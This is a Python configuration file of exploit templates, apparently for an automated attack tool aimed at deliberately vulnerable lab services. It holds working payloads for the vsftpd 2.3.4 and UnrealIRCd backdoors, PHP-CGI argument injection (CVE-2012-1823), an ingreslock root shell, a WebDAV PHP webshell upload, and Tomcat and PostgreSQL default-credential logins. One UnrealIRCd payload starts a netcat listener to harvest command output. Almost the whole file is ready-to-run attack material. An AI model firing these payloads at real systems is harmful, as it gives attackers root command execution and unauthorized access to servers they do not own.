VALIDATION_TEMPLATES = {
    # --- SAFE / PASSIVE CHECKS (Low Noise) ---
    "version_banner_check": {
        "executor": "socket_grab",
        "params": {"timeout": 5},
        "validation": {
            "type": "regex",
            "pattern": r"(vsFTPd 2\.3\.4|UnrealIRCd-3\.2\.8\.1|OpenSSH_4\.7)"
        },
        "description": "Extracts the service banner to confirm the presence of a known vulnerable version."
    },
    "http_header_leak": {
        "executor": "http_request",
        "params": {"method": "HEAD", "path": "/", "timeout": 5},
        "validation": {
            "type": "header_contains",
            "header": "Server",
            "expected": "Apache/2.2.8"
        },
        "description": "Checks HTTP response headers for specific server version disclosure."
    },
    "anonymous_ftp_check": {
        "executor": "socket_send", # Changed to socket_send to handle user/pass flow manually if needed, or use specific ftp executor
        "params": {
            "port": 21, 
            "payload": "USER anonymous\r\nPASS guest\r\n", 
            "timeout": 5
        },
        "validation": {
            "type": "regex",
            "pattern": r"230 Login successful"
        },
        "description": "Tests if the FTP service allows unauthenticated anonymous access."
    },

    # --- ACTIVE VERIFICATION CHECKS (High Fidelity) ---
    
    # 1. vsftpd 2.3.4 Backdoor (Port 21)
    "vsftpd_backdoor_check": {
        "executor": "socket_send",
        "params": {
            "port": 21,
            # The smiley face :) triggers the backdoor on port 6200
            "payload": "USER backdoored:)\r\nPASS password\r\n", 
            "timeout": 5
        },
        "validation": {
            # In a real attack, we'd check port 6200. 
            # For validation, we check if the server accepts the weird username without crashing immediately.
            "type": "regex", 
            "pattern": r"(331|230)" 
        },
        "description": "Trigger the vsftpd 2.3.4 backdoor initiation sequence."
    },

    # 2. UnrealIRCd Backdoor (Port 6667)
    "unrealircd_backdoor_check": {
        "executor": "socket_send",
        "params": {
            "port": 6667,
            # 'AB;' is the trigger. We run 'id' to prove we are root.
            "payload": "AB; id\n", 
            "timeout": 5
        },
        "validation": {
            "type": "regex",
            "pattern": r"uid=\d+" # Matches 'uid=0(root)'
        },
        "description": "Sends the 'AB;' trigger to execute a harmless 'id' command."
    },

    # 3. PHP-CGI Argument Injection (Port 80)
    "php_cgi_rce_check": {
        "executor": "http_request",
        "params": {
            "method": "POST",
            "port": 80,
            # The query string injects the config changes
            "path": "/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input",
            "timeout": 5,
            # The body is the code we want to run
            "body": "<?php echo 'VULNERABLE_SYSTEM'; ?>" 
        },
        "validation": {
            "type": "body_contains",
            "expected": "VULNERABLE_SYSTEM"
        },
        "description": "Exploits CVE-2012-1823 to execute echo command via HTTP."
    },

    # 4. Tomcat Default Credentials (Port 8180)
    "tomcat_mgr_login_check": {
        "executor": "http_request",
        "params": {
            "method": "GET", 
            "path": "/manager/html", 
            "port": 8180,
            "auth": ("tomcat", "tomcat"), # Tuple for Basic Auth
            "timeout": 5
        },
        "validation": {
            "type": "status_code",
            "expected": 200
        },
        "description": "Verifies if Tomcat Manager is accessible via default 'tomcat:tomcat' credentials."
    },

    # 5. Ingreslock Root Shell (Port 1524)
    "root_shell_1524_check": {
        "executor": "socket_send",
        "params": {
            "port": 1524,
            "payload": "whoami\n", 
            "timeout": 5
        },
        "validation": {
            "type": "regex",
            "pattern": "root"
        },
        "description": "Checks for the famous 'Ingreslock' bind shell on port 1524."
    },
    
    # 6. PostgreSQL Default Creds (Port 5432)
    "postgres_default_check": {
        "executor": "socket_send",
        "params": {
            "port": 5432,
            # A raw startup packet for user 'postgres' database 'template1'
            # This is binary data, so we might need to handle encoding in the executor or use a hex string
            "payload": "\x00\x00\x00\x54\x00\x03\x00\x00\x75\x73\x65\x72\x00\x70\x6f\x73\x74\x67\x72\x65\x73\x00\x64\x61\x74\x61\x62\x61\x73\x65\x00\x74\x65\x6d\x70\x6c\x61\x74\x65\x31\x00\x00",
            "timeout": 5
        },
        "validation": {
            "type": "regex", 
            "pattern": r"R" # Postgres returns 'R' (AuthenticationOk) if no password is needed
        },
        "description": "Checks if PostgreSQL allows login as 'postgres' with no password."
    }
}

ATTACK_TEMPLATES = {
    # --- 1. The "Free Win" (Port 1524) ---
    "root_shell_backdoor": {
        "executor": "socket_send",
        "description": "Checks for a misconfigured bind shell (ingreslock) that gives root access without a password.",
        "params": {
            "port": 1524,
            "payload": "id\n",  # Simply asking 'who am i?'
            "timeout": 5
        },
        "validation": {
            "type": "regex",
            "pattern": "uid=0\(root\)" # If it replies root, we win.
        }
    },

    # --- 2. The Classic Backdoor (Port 6667) ---
    "unrealircd_backdoor": {
        "executor": "socket_send",
        "description": "Triggers the UnrealIRCd 3.2.8.1 backdoor using the 'AB;' command injection.",
        "params": {
            "port": 6667,
            "payload": "AB; id\n", 
            "timeout": 5
        },
        "validation": {
            "type": "regex",
            "pattern": "uid=\d+" # Looks for any user ID in response
        }
    },

    # --- 3. The Web Injection (Port 80) ---
    "php_cgi_rce": {
        "executor": "http_request",
        "description": "Exploits CVE-2012-1823 (PHP-CGI Argument Injection) to execute commands via HTTP.",
        "params": {
            "method": "POST",
            "port": 80,
            "path": "/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input",
            "timeout": 5,
            # We echo a specific marker to confirm RCE
            "body": "<?php echo 'VULN_CONFIRMED'; ?>" 
        },
        "validation": {
            "type": "body_contains",
            "expected": "VULN_CONFIRMED"
        }
    },

    # --- 4. Default Credentials (Port 8180) ---
    "tomcat_mgr_login": {
        "executor": "http_request",
        "description": "Attempts to login to Tomcat Manager with default credentials (tomcat:tomcat).",
        "params": {
            "method": "GET",
            "port": 8180,
            "path": "/manager/html",
            "auth": ["tomcat", "tomcat"], # The requests lib handles Basic Auth
            "timeout": 5
        },
        "validation": {
            "type": "status_code",
            "expected": 200 # 200 OK means login worked. 401 means failed.
        }
    },

    # --- 5. Database Weakness (Port 5432) ---
    "postgres_default_check": {
        "executor": "socket_send",
        "description": "Checks if PostgreSQL accepts connections. (Basic banner grab/handshake check).",
        "params": {
            "port": 5432,
            "payload": "\x00\x00\x00\x08\x04\xd2\x16\x2f", # SSL Request packet to trigger response
            "timeout": 3
        },
        "validation": {
            "type": "regex",
            "pattern": "S|N" # Postgres replies with S (Yes) or N (No) for SSL
        }
    },
    
    # --- 6. The vsftpd Backdoor (Port 21) ---
    "vsftpd_234_backdoor": {
        "executor": "socket_send",
        "description": "Triggers the vsftpd 2.3.4 backdoor smiley face. (Note: Validating success requires checking port 6200).",
        "params": {
            "port": 21,
            "payload": "USER backdoored:)\r\nPASS password\r\n",
            "timeout": 3
        },
        "validation": {
            "type": "regex",
            "pattern": "(220|331)" # Just confirms we can talk to it. Real validation is port 6200 check.
        }
    }
}


MASTER_TEMPLATES = {
    # ==========================================
    # CATEGORY: SAFE VALIDATION (Recon/Passive)
    # ==========================================
    "version_banner_check": {
        "category": "safe_check",
        "executor": "socket_grab",
        "params": {"timeout": 5},
        "validation": {"type": "regex", "pattern": r"(vsFTPd 2\.3\.4|UnrealIRCd-3\.2\.8\.1|OpenSSH_4\.7)"},
        "description": "Extracts the service banner to confirm the presence of a known vulnerable version."
    },
    "http_header_leak": {
        "category": "safe_check",
        "executor": "http_request",
        "params": {"method": "HEAD", "path": "/", "timeout": 5},
        "validation": {"type": "header_contains", "header": "Server", "expected": "Apache/2.2.8"},
        "description": "Checks HTTP response headers for specific server version disclosure."
    },

    # ==========================================
    # CATEGORY: ACTIVE EXPLOITATION (High Noise)
    # ==========================================
    "root_shell_backdoor_1524": {
        "category": "active_exploit",
        "executor": "socket_send",
        "description": "Checks for a misconfigured bind shell (ingreslock) that gives root access without a password.",
        "params": {"port": 1524, "payload": "id\n", "timeout": 5},
        "validation": {"type": "regex", "pattern": r"uid=0\(root\)"}
    },
    "unrealircd_backdoor_6667": {
        "category": "active_exploit",
        "executor": "socket_send",
        "description": "Triggers the UnrealIRCd 3.2.8.1 backdoor using the 'AB;' command injection.",
        "params": {"port": 6667, "payload": "AB; id\n", "timeout": 5},
        "validation": {"type": "regex", "pattern": r"uid=\d+"}
    },
    "php_cgi_rce_80": {
        "category": "active_exploit",
        "executor": "http_request",
        "description": "Exploits CVE-2012-1823 (PHP-CGI Argument Injection) to execute commands via HTTP.",
        "params": {
            "method": "POST",
            "port": 80,
            "path": "/index.php?-d+allow_url_include=on+-d+auto_prepend_file=php://input",
            "timeout": 5,
            "body": "<?php echo 'VULN_CONFIRMED'; ?>" 
        },
        "validation": {"type": "body_contains", "expected": "VULN_CONFIRMED"}
    }
    
}




MASTER_TEMPLATES = {
    "root_shell_backdoor_1524": {
        "category": "active_exploit",
        "service": "ingreslock",
        "description": "Checks for an unauthenticated root bind shell on port 1524. This grants immediate OS-level control.",
        "params": {
            "port": 1524,
            "payload": "id\n",
            "timeout": 5,
            "delay": 1 # We include a 1s delay to handle shell prompt buffering
        },
        "validation": {
            "type": "regex",
            "pattern": r"uid=0\(root\)"
        }
    },
"unrealircd_backdoor_6667": {
        "category": "active_exploit",
        "service": "irc",
        "description": "Exploits a Trojan Horse backdoor (CVE-2010-2075) in UnrealIRCd. Uses an Out-Of-Band netcat listener to harvest blind execution output.",
        "executor": "socket_blind_rce", # NEW EXECUTOR TYPE
        "params": {
            "port": 6667,
            "payload": "AB; nohup sh -c 'id | nc -l -p 4444' &\n", 
            "harvest_port": 4444, # The port we connect to for evidence
            "timeout": 5,
            "delay": 1
        },
        "validation": {
            "type": "regex",
            "pattern": r"uid=\d+"
        }
    },
    "vsftpd_234_backdoor_21": {
        "category": "active_exploit",
        "service": "ftp",
        "description": "Triggers the CVE-2011-2523 vsftpd smiley face backdoor on port 21, then connects to the resulting root shell on port 6200.",
        "executor": "socket_trigger_and_connect", # NEW EXECUTOR
        "params": {
            "port": 21,
            "trigger_payload": "USER backdoored:)\r\nPASS pass\r\n",
            "shell_port": 6200,
            "shell_payload": "id\n",
            "timeout": 5,
            "delay": 1
        },
        "validation": {
            "type": "regex",
            "pattern": r"uid=0\(root\)"
        }
    },
    "tomcat_mgr_login_8180": {
        "category": "active_exploit",
        "service": "http",
        "description": "Attempts to authenticate to the Tomcat Manager application using default credentials (tomcat:tomcat).",
        "executor": "http_request", # We already wrote this executor in attack.py!
        "params": {
            "method": "GET",
            "port": 8180,
            "path": "/manager/html",
            "auth": ["tomcat", "tomcat"], # Note: JSON uses lists, Python requests needs tuples. We handle this conversion in attack.py.
            "timeout": 5
        },
        "validation": {
            "type": "status_code",
            "expected": 200
        }
    },
    "webdav_upload_80": {
        "category": "active_exploit",
        "service": "http",
        "description": "Exploits unauthenticated WebDAV access. Uploads a PHP shell via HTTP PUT and executes it via HTTP GET.",
        "executor": "http_put_and_get",
        "params": {
            "port": 80,
            "put_path": "/dav/agent_shell.php",
            "payload": "<?php echo \"VULNERABLE_SYSTEM_CONFIRMED\\n\"; system('id'); ?>",
            "timeout": 5
        },
        "validation": {
            "type": "body_contains",
            "expected": "VULNERABLE_SYSTEM_CONFIRMED"
        }
    },  
    "postgres_default_creds_5432": {
        "category": "active_exploit",
        "service": "postgresql",
        "description": "Attempts to log into PostgreSQL using default superuser credentials (postgres:postgres).",
        "executor": "postgres_login",
        "params": {
            "port": 5432,
            "user": "postgres",
            "password": "postgres",
            "database": "template1",
            "query": "SELECT current_user;",
            "timeout": 5
        },
        "validation": {
            "type": "exact_match",
            "expected": "postgres"
        }
    }
}